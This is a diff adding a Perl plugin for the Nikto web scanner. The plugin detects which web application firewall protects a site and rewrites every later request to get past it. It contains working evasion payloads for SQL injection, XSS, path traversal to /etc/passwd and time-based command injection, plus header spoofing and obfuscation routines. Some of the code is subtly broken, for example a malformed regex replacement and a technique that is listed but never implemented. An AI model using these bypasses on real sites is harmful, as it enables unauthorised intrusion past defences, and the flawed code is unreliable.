@@ -1,0 +1,304 @@
+###############################################################################
+#  Copyright (C) 2025 Enhanced Nikto Project
+#
+#  This program is free software; you can redistribute it and/or
+#  modify it under the terms of the GNU General Public License
+#  as published by the Free Software Foundation; version 2
+#  of the License only.
+#
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+#
+###############################################################################
+# PURPOSE:
+# Advanced WAF bypass techniques based on 2025 research
+###############################################################################
+
+sub nikto_waf_bypass_advanced_init {
+    my $id = { name        => "waf_bypass_advanced",
+               full_name   => "Advanced WAF Bypass Techniques",
+               author      => "Enhanced Nikto Project",
+               description => "Implements advanced WAF bypass techniques for 2025 protection systems",
+               hooks       => {
+                   scan => { method => \&nikto_waf_bypass_advanced_scan, weight => 20 },
+                   start => { method => \&nikto_waf_bypass_advanced_load, weight => 10 }
+               },
+               copyright => "2025 Enhanced Nikto Project"
+               };
+    return $id;
+}
+
+sub nikto_waf_bypass_advanced_load {
+    # Load WAF signatures and bypass techniques
+    my ($mark) = @_;
+    
+    # Initialize WAF detection patterns
+    %WAF_SIGNATURES = (
+        'Cloudflare' => ['cf-ray', 'cloudflare', '__cfduid'],
+        'AWS WAF' => ['x-amzn-waf', 'awselb'],
+        'Akamai' => ['akamai', 'x-akamai-transformed'],
+        'Imperva' => ['x-iinfo', 'incap_ses', 'visid_incap'],
+        'F5 BIG-IP' => ['x-cnection', 'bigip', 'f5'],
+        'Fortinet' => ['fortigate', 'fortiwafsid'],
+        'Barracuda' => ['barra_counter_session'],
+        'Citrix' => ['ns_af', 'citrix', 'netscaler'],
+        'Sucuri' => ['sucuri', 'x-sucuri-id'],
+        'ModSecurity' => ['mod_security', 'modsecurity']
+    );
+    
+    # Initialize bypass techniques
+    @BYPASS_TECHNIQUES = (
+        'unicode_encoding',
+        'mixed_case_randomization',
+        'comment_injection',
+        'http_parameter_pollution',
+        'header_manipulation',
+        'payload_wrapping',
+        'slow_http',
+        'timing_based',
+        'second_order'
+    );
+    
+    # Load evasion payloads
+    %EVASION_PAYLOADS = (
+        'sql_injection' => [
+            "SELECT%u0020*%u0020FROM%u0020users",
+            "SEL/**/ECT * FROM users",
+            "SeLeCt * FrOm users",
+            "/*!50000SELECT*/ * FROM users",
+            "CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))"
+        ],
+        'xss' => [
+            "<scr\u0131pt>alert(1)</scr\u0131pt>",
+            "<img/src='x'/onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "<scr<script>ipt>alert(1)</script>",
+            "javascript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A//<svg/onload=alert(1)>"
+        ],
+        'path_traversal' => [
+            "%252e%252e%252f",
+            "..%c0%af",
+            "..%ef%bc%8f",
+            "%c0%ae%c0%ae/",
+            "....//....//etc/passwd"
+        ],
+        'command_injection' => [
+            "$(sleep${IFS}5)",
+            "`sleep${IFS}5`",
+            "||sleep${IFS}5||",
+            ";sleep${IFS}5;",
+            "${IFS}&&${IFS}sleep${IFS}5"
+        ]
+    );
+    
+    return $mark;
+}
+
+sub nikto_waf_bypass_advanced_scan {
+    my ($mark) = @_;
+    my $waf_detected = 0;
+    my $waf_type = "";
+    
+    # Detect WAF presence and type
+    my $request = LW2::http_new_request(method => "GET", uri => "/");
+    my $response = LW2::http_do_request($mark, $request);
+    
+    foreach my $waf (keys %WAF_SIGNATURES) {
+        foreach my $signature (@{$WAF_SIGNATURES{$waf}}) {
+            if (LW2::dump_headers($response) =~ /$signature/i) {
+                $waf_detected = 1;
+                $waf_type = $waf;
+                last;
+            }
+        }
+        last if $waf_detected;
+    }
+    
+    # If WAF detected, apply bypass techniques
+    if ($waf_detected) {
+        nprint("+ WAF detected: $waf_type", "v");
+        nprint("+ Applying advanced WAF bypass techniques", "v");
+        
+        # Apply appropriate bypass techniques based on WAF type
+        apply_bypass_techniques($mark, $waf_type);
+    }
+    else {
+        nprint("+ No WAF detected, using standard scanning techniques", "v");
+    }
+    
+    return $mark;
+}
+
+sub apply_bypass_techniques {
+    my ($mark, $waf_type) = @_;
+    
+    # Set global WAF bypass flags
+    $mark->{'waf_bypass'} = 1;
+    $mark->{'waf_type'} = $waf_type;
+    
+    # Apply specific techniques based on WAF type
+    if ($waf_type eq 'Cloudflare') {
+        $mark->{'waf_bypass_techniques'} = ['unicode_encoding', 'timing_based', 'header_manipulation'];
+    }
+    elsif ($waf_type eq 'AWS WAF') {
+        $mark->{'waf_bypass_techniques'} = ['mixed_case_randomization', 'http_parameter_pollution', 'payload_wrapping'];
+    }
+    elsif ($waf_type eq 'ModSecurity') {
+        $mark->{'waf_bypass_techniques'} = ['comment_injection', 'unicode_encoding', 'slow_http'];
+    }
+    else {
+        # Default techniques for other WAFs
+        $mark->{'waf_bypass_techniques'} = ['unicode_encoding', 'mixed_case_randomization', 'http_parameter_pollution'];
+    }
+    
+    # Apply evasion to all subsequent requests
+    hook_request_modification($mark);
+}
+
+sub hook_request_modification {
+    my ($mark) = @_;
+    
+    # Hook into the HTTP request process to modify outgoing requests
+    $mark->{'hooks'}->{'request'} = \&modify_request_for_waf_bypass;
+}
+
+sub modify_request_for_waf_bypass {
+    my ($mark, $request) = @_;
+    
+    # Skip modification if WAF bypass is not enabled
+    return $request unless $mark->{'waf_bypass'};
+    
+    my $techniques = $mark->{'waf_bypass_techniques'};
+    
+    # Apply each enabled technique
+    foreach my $technique (@$techniques) {
+        if ($technique eq 'unicode_encoding') {
+            apply_unicode_encoding($request);
+        }
+        elsif ($technique eq 'mixed_case_randomization') {
+            apply_mixed_case_randomization($request);
+        }
+        elsif ($technique eq 'comment_injection') {
+            apply_comment_injection($request);
+        }
+        elsif ($technique eq 'http_parameter_pollution') {
+            apply_http_parameter_pollution($request);
+        }
+        elsif ($technique eq 'header_manipulation') {
+            apply_header_manipulation($request);
+        }
+        elsif ($technique eq 'payload_wrapping') {
+            apply_payload_wrapping($request);
+        }
+        elsif ($technique eq 'slow_http') {
+            apply_slow_http($request);
+        }
+        elsif ($technique eq 'timing_based') {
+            apply_timing_based($request);
+        }
+    }
+    
+    return $request;
+}
+
+# Technique implementations
+
+sub apply_unicode_encoding {
+    my ($request) = @_;
+    
+    # Convert specific characters to Unicode encoding
+    $request->{'uri'} =~ s/ /%u0020/g;
+    $request->{'uri'} =~ s/=/%u003D/g;
+    $request->{'uri'} =~ s/'/%u0027/g;
+    $request->{'uri'} =~ s/"/%u0022/g;
+    
+    return $request;
+}
+
+sub apply_mixed_case_randomization {
+    my ($request) = @_;
+    
+    # Apply case randomization to SQL keywords
+    $request->{'uri'} =~ s/select/SeLeCt/gi;
+    $request->{'uri'} =~ s/union/UnIoN/gi;
+    $request->{'uri'} =~ s/where/WhErE/gi;
+    $request->{'uri'} =~ s/from/FrOm/gi;
+    
+    return $request;
+}
+
+sub apply_comment_injection {
+    my ($request) = @_;
+    
+    # Insert SQL comments in keywords
+    $request->{'uri'} =~ s/select/SEL\/*\*\/ECT/gi;
+    $request->{'uri'} =~ s/union/UNI\/*\*\/ON/gi;
+    $request->{'uri'} =~ s/where/WHE\/*\*\/RE/gi;
+    $request->{'uri'} =~ s/from/FR\/*\*\/OM/gi;
+    
+    return $request;
+}
+
+sub apply_http_parameter_pollution {
+    my ($request) = @_;
+    
+    # Duplicate parameters with different values
+    if ($request->{'uri'} =~ /\?([^=]+)=([^&]+)/) {
+        my $param = $1;
+        my $value = $2;
+        $request->{'uri'} .= "&$param=$value";
+    }
+    
+    return $request;
+}
+
+sub apply_header_manipulation {
+    my ($request) = @_;
+    
+    # Add custom headers to confuse WAF
+    $request->{'headers'}->{'X-Originating-IP'} = '127.0.0.1';
+    $request->{'headers'}->{'X-Forwarded-For'} = '127.0.0.1';
+    $request->{'headers'}->{'X-Remote-IP'} = '127.0.0.1';
+    $request->{'headers'}->{'X-Remote-Addr'} = '127.0.0.1';
+    
+    return $request;
+}
+
+sub apply_payload_wrapping {
+    my ($request) = @_;
+    
+    # Wrap payloads in HTML comments or tags
+    $request->{'uri'} =~ s/<script>/<scr<script>ipt>/gi;
+    $request->{'uri'} =~ s/alert\(/prompt\()/gi;
+    
+    return $request;
+}
+
+sub apply_slow_http {
+    my ($request) = @_;
+    
+    # Set headers for slow HTTP attack
+    $request->{'headers'}->{'Connection'} = 'keep-alive';
+    $request->{'headers'}->{'Content-Length'} = '1000000';
+    
+    return $request;
+}
+
+sub apply_timing_based {
+    my ($request) = @_;
+    
+    # Add timing-based payloads
+    if ($request->{'uri'} =~ /\?([^=]+)=([^&]+)/) {
+        my $param = $1;
+        my $value = $2;
+        if ($value =~ /^\d+$/) {
+            $request->{'uri'} =~ s/$param=$value/$param=$value AND SLEEP(0)/;
+        }
+    }
+    
+    return $request;
+}
+
+1;
